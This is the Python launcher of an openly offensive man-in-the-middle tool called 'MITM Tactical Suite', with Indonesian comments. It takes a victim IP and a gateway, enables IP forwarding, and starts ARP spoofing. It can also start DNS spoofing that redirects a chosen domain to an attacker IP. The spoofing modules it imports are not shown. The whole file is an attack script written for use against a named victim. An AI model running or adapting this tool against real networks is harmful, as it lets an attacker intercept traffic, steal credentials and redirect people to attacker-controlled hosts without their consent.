#!/usr/bin/env python3
"""
MITM Tactical Suite - Entry Point
"""
import argparse
import threading
import sys
import time
from utils.logger import logger
from utils.network_ops import toggle_ip_forwarding
from core.arp_module import ARPSpoofer
from core.dns_module import DNSSpoofer

def show_banner():
    banner = """
       ___  _  _ ___   ___                     __ 
      |   \\| \\| / __| / __| _ __  ___  ___  / _|
      | |) | .` \\__ \\ \\__ \\| '_ \\/ _ \\/ _ \\|  _|
      |___/|_|\\_|___/ |___/| .__/\\___/\\___/|_|  
                           |_|                  
    ================================================
    [+] MITM Tactical Suite (Modular Architecture)
    [+] Created by : Haykal Azriel Priatama
    ================================================
    """
    print(banner)

def main():
    show_banner()
    parser = argparse.ArgumentParser(description="MITM Tactical Suite - ARP & DNS Spoofing")
    
    # Wajib (ARP)
    parser.add_argument("-t", "--target", dest="target", required=True, help="Victim IP Address")
    parser.add_argument("-g", "--gateway", dest="gateway", required=True, help="Gateway IP Address")
    
    # Opsional (DNS)
    parser.add_argument("-d", "--domain", dest="domain", help="Target Domain for DNS Spoofing (e.g., target.com)")
    parser.add_argument("-r", "--rogue", dest="rogue_ip", help="Rogue IP for DNS Spoofing (Attacker IP)")

    options = parser.parse_args()

    toggle_ip_forwarding(enable=True)
    
    # Thread ARP 
    arp_spoofer = ARPSpoofer(options.target, options.gateway)
    arp_thread = threading.Thread(target=arp_spoofer.run)
    arp_thread.daemon = True
    arp_thread.start()

    # Thread DNS 
    if options.domain and options.rogue_ip:
        dns_spoofer = DNSSpoofer(options.domain, options.rogue_ip)
        dns_thread = threading.Thread(target=dns_spoofer.run)
        dns_thread.daemon = True
        dns_thread.start()
    else:
        logger.info("Parameter DNS tidak diisi. Hanya menjalankan serangan ARP murni.")

    try:
        # Menjaga program utama tetap hidup
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n")
        logger.info("Sinyal interupsi diterima (CTRL+C)!")
        arp_spoofer.is_running = False
        arp_spoofer.restore()
        toggle_ip_forwarding(enable=False)
        logger.info("Suite dihentikan dengan aman.")
        sys.exit(0)

if __name__ == "__main__":
    main()